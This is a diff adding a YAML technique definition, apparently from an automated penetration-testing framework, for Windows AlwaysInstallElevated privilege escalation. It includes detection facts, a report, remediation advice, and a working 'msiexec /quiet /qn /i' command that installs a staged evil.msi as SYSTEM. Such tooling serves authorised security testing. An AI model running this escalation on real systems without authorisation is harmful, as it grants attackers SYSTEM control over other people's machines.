@@ -1,0 +1,55 @@
+# AlwaysInstallElevated → SYSTEM
+#
+# Windows Installer will run an .msi with SYSTEM privileges when both
+# HKLM\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
+# and the HKCU mirror are set to 1. It's a deliberate policy toggle,
+# usually left on from an intune / imaging misstep, and it's a
+# one-shot SYSTEM primitive: install any .msi via msiexec /quiet /qn.
+# Ported from privesc._d_win_aie.
+#
+# MITRE: T1548.002 (Bypass User Account Control). The `builds` block
+# tells the escalate loop to build a .msi on the operator side then
+# stage it — same shape the inlined driver used
+# (builds=(("msi", staged, None),)).
+technique: T1548.002
+name: AlwaysInstallElevated → SYSTEM
+tactic: [privilege-escalation, defense-evasion]
+platform: [windows]
+key: aie
+ranking:
+  exploitability: high         # one-shot msiexec install
+  safety: config-change        # writes an .msi to disk; cleanup removes it
+  detection: moderate           # msiexec + SYSTEM install shows in event log
+detect:
+  facts_match:
+    always_install_elevated: true
+execute:
+  # The .msi is built + staged by the escalate loop via `builds:` below;
+  # this command is the one-shot install line.
+  command: 'msiexec /quiet /qn /i {{stage}}\evil.msi'
+  builds:
+    - format: msi
+      as: '{{stage}}\evil.msi'
+      # `run: null` means "use the poc's default proof" — the built .msi
+      # runs whoami and writes the SYSTEM identity, matching what the
+      # inlined driver requested.
+verify:
+  success: "NT AUTHORITY"
+cleanup:
+  command: 'del {{stage}}\evil.msi'
+report:
+  vector_type: alwaysinstallelevated
+  evidence: "AlwaysInstallElevated=0x1 in HKLM and HKCU"
+  description: >
+    Both AlwaysInstallElevated registry values are set to 1 — Windows
+    Installer will install any .msi with SYSTEM privileges regardless
+    of the invoking user's rights. One-shot install via
+    `msiexec /quiet /qn /i` runs the .msi's custom action as SYSTEM.
+  remediation: >
+    Set both AlwaysInstallElevated values to 0
+    (HKLM\Software\Policies\Microsoft\Windows\Installer and the HKCU
+    mirror), then GPO-lock the policy so a user can't flip it back.
+    There's no legitimate reason to leave this enabled on a modern
+    Windows image — it exists for scenarios that predate WSUS and
+    modern deployment tooling.
+  refs: [T1548.002, AlwaysInstallElevated]
